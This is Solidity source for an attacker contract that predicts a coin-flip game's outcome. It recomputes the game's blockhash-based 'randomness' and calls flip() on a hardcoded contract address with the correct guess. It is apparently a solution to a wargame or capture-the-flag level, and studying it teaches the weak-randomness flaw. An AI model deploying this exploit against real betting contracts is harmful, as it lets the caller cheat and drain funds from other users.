// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "ICoinFlip.sol";

contract GuessFlip {

    address coin_flip_address = 0xFA8683801eC3010CeC73b3e90c1B57C951b1488E;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function guess() public {

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        ICoinFlip(coin_flip_address).flip(side);
    }

}

// SPDX-License-Identifier: MIT

pragma solidity 0.8.10;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}